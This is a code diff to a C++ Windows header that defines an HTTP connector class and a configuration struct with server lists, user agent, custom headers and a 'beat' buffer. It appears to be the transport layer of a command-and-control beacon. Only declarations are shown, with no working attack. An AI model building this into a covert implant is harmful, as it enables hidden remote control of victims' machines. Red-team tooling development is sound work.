@@ -3,6 +3,23 @@
 #include <windows.h>
 #include <wininet.h>
 
+#ifndef PROFILE_STRUCT
+#define PROFILE_STRUCT
+typedef struct {
+	WORD   port;
+	ULONG  servers_count;
+	BYTE** servers;
+	BOOL   use_ssl;
+	BYTE* http_method;
+	BYTE* uri;
+	BYTE* parameter;
+	BYTE* user_agent;
+	BYTE* http_headers;
+	ULONG  ans_pre_size;
+	ULONG  ans_size;
+} ProfileHTTP;
+#endif
+
 #define DECL_API(x) decltype(x) * x
 
 struct HTTPFUNC {
@@ -27,27 +44,36 @@ struct HTTPFUNC {
 
 class ConnectorHTTP
 {
-	CHAR*     user_agent;
-	CHAR*     host_header;
-	BOOL      ssl;
-	CHAR*     http_method;
-	ULONG	  server_count;
-	CHAR**    server_address;
-	WORD      server_port;
-	CHAR*     uri;
-	CHAR*     headers;
-	HTTPFUNC* functions;
+	CHAR*  user_agent     = NULL;
+	CHAR*  host_header	  = NULL;
+	BOOL   ssl			  = FALSE;
+	CHAR*  http_method    = NULL;
+	ULONG  server_count   = 0;
+	CHAR** server_address = NULL;
+	WORD   server_port    = 0;
+	CHAR*  uri            = NULL;
+	CHAR*  headers        = NULL;
+	ULONG  ans_size       = 0;
+	ULONG  ans_pre_size   = 0;
+
+	BYTE* recvData = NULL;
+	DWORD recvSize = 0;
+
+	HTTPFUNC* functions = NULL;
 
 	HINTERNET hInternet = NULL;
 	HINTERNET hConnect  = NULL;
 
 	ULONG server_index = 0;
 
-
 public:
 	ConnectorHTTP();
 
-	void  SetConfig(BOOL Ssl, CHAR* UserAgent, CHAR* Method, ULONG AddressCount, CHAR** Address, WORD Port, CHAR* Uri, CHAR* Headers);
-	BYTE* SendData(BYTE* data, ULONG data_size, ULONG* recv_size);
-	void  CloseConnector();
+	BOOL SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize);
+	void CloseConnector();
+
+	void  SendData(BYTE* data, ULONG data_size);
+	BYTE* RecvData();
+	DWORD RecvSize();
+	void  RecvClear();
 };
